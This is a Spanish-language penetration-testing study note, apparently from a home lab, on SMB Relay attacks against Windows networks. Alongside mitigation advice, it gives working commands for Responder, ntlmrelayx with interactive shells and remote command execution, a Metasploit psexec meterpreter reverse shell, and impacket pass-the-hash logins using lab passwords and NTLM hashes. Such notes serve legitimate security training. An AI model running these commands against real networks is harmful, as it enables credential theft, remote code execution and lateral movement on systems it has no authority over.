### 🔎 ¿Qué es SMB Relay?

SMB Relay es una técnica de ataque donde, en lugar de descifrar los hashes de contraseñas capturados (por ejemplo, con **Responder**), se reenvían directamente a otras máquinas para intentar autenticarse y obtener acceso sin conocer la contraseña.

> [!NOTE]
>En un ataque de **SMB Relay**, es fundamental que el archivo `targets.txt` contenga **más de una IP o destino**. Esto se debe a que, si el equipo desde el cual se origina la autenticación (es decir, la víctima que intenta acceder a un recurso inexistente) **coincide con una de las IPs en el archivo de objetivos**, el relay **fallará automáticamente**. ¿Por qué? Porque `ntlmrelayx` **no puede relayar una autenticación hacia el mismo host que la genera**.
>
>Por lo tanto, en `targets.txt` deben incluirse **todas las IPs posibles** de equipos donde el usuario autenticado **tenga privilegios de administrador local**. Esto maximiza la posibilidad de que el relay sea exitoso y permita ejecutar comandos o establecer una sesión privilegiada en alguna de esas máquinas.



---

### ⚙️ Requisitos para que funcione:

1. **SMB Signing (firma de SMB)** debe estar **deshabilitada** o **no forzada** en el sistema objetivo.
    
2. Las credenciales capturadas deben pertenecer a un **usuario con privilegios de administrador** en la máquina de destino.
    

---

### 🛡️ Mitigación del SMB Relay

1. ✅ **Habilitar y forzar SMB Signing**
    
    - En GPO o registro de Windows, asegúrate de que la firma SMB esté **habilitada y requerida**.
        
    - Ruta GPO:  
        `Configuración del equipo > Configuración de Windows > Configuración de seguridad > Directivas locales > Opciones de seguridad`  
        → Activar:  
        **"Microsoft network client: Digitally sign communications (always)"**  
        **"Microsoft network server: Digitally sign communications (always)"**
        
2. ✅ **Deshabilitar protocolos inseguros como SMBv1**
    
    - Usa solo SMBv2 o SMBv3.
        
3. ✅ **Segmentar la red**
    
    - Limitar quién puede comunicarse con quién, especialmente entre estaciones de trabajo.
        
4. ✅ **Control de acceso estricto**
    
    - No dar privilegios de administrador innecesarios.
        

---

### 🧰 Herramientas comunes usadas para SMB Relay

- **Responder** → Captura los hashes.
    
- **Impacket (ntlmrelayx.py)** → Reenvía los hashes a otros sistemas para autenticarse.
    
- **mitm6** → En redes con IPv6, puede combinarse con SMB Relay para explotar entornos sin mucha configuración.



## Lanzamiento de SMB Relay Attack

### Identificación

Para identificar los equipos que no tienen la firma de SMB habilitada, podemos usar lo siguiente

```bash
nmap --script=smb2-security-mode.nse -p 445 <IP>
```

![[Pasted image 20250425154731.png]]

### Configuración del Responder


Este archivo se encuentra en **/etc/responder/Responder.conf**

> [!NOTE]
> Normalmente el DC, tiene por defecto la firma habilitada y requerida.



Tenemos que poner:
+ SMB = off
+ HTTP = off

![[Pasted image 20250425154909.png]]



Despues ejecutaremos el responder para SMB Relay

```bash
sudo responder -I eth0 -dwP
```


### ntlmrelayx.py

Esta herramienta recibe los hashes NTLM capturados y los **envía a un objetivo específico**.

📌 Esto:

- Escucha conexiones entrantes.
    
- Cuando un hash NTLM llega, lo reenvía al servidor objetivo.
    
- Si ese hash es válido y pertenece a un usuario con permisos, obtienes acceso.
    

🔐 Para que funcione:

- El objetivo **NO debe tener SMB signing forzado**.
    
- El usuario debe ser **admin local o tener permisos válidos**.

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```


Si añadimos **-i** al comando, podremos obtener una shell directamente en lugar de la SAM de usuario local.

Para despues conectarnos despues de poner el -i , tendremos que conectarnos a la victima

![[Pasted image 20250425190101.png]]

```bash
nc 127.0.0.1 11000
```


Si añadimos el parámetro **-c "whoami"** este comando directamente se ejecutara en la Víctima.

![[Pasted image 20250425190148.png]]

Despues, esperamos a que un usuario acceda a un lugar no existente, despues no saldrán los Hashes SAM de las cuentas de administrador local de los equipos que estan en el targets.txt

![[Pasted image 20250425185857.png]]




## Shell Access

### msfconsole

```bash
msfconsole
```

Seleccionamos el exploit que utiliza psexec

```bash
use exploit/windows/smb/psexec
```

Metemos el payload

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Metemos las ips de las victimas y el dominio al que pertenecen

```bash
set rhosts 192.168.0.226
```

```bash
set smbdomain MARVEL.local
```

Añadimos al usuario de smb y su password

```bash
set smbuser Administrador
```

```bash
set smbpass password
```



### psexec

esta opcion no te da un meterpretes o una stagged shell pero va bastante bien

```bash
impacket-psexec MARVEL/fcastle:'Mypassword1234!'@192.168.0.225
```


Tambien le podemos pasar los hashes SAM

```bash
impacket-psexec administrador@192.168.0.225 -hashes aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840
```
 
Tambien tenemos distintas herramientas a parte de psexec, como **smbexec** o **wmiexec**.

```bash
impacket-smbexec administrador@192.168.0.225 -hashes aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840
```

```bash
impacket-wmiexec administrador@192.168.0.225 -hashes aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840
```



# 🛡️ Estrategias de mitigación (Mitigation Strategies)

### 🔹 1. Habilitar la firma SMB en todos los dispositivos

- **Pro:** Detiene completamente el ataque.
    
- **Con:** Puede afectar el rendimiento en la copia de archivos.
    

### 🔹 2. Deshabilitar la autenticación NTLM en la red

- **Pro:** Detiene completamente el ataque.
    
- **Con:** Si Kerberos falla, Windows volverá a usar NTLM.
    

### 🔹 3. Tiering de cuentas (Account tiering)

- **Pro:** Limita a los administradores de dominio a tareas específicas (ej: solo conectarse a servidores donde se necesiten permisos elevados).
    
- **Con:** Puede ser difícil aplicar y mantener esta política.
    

### 🔹 4. Restricción de administradores locales

- **Pro:** Previene gran parte del movimiento lateral.
    
- **Con:** Puede aumentar el número de tickets en el soporte técnico.
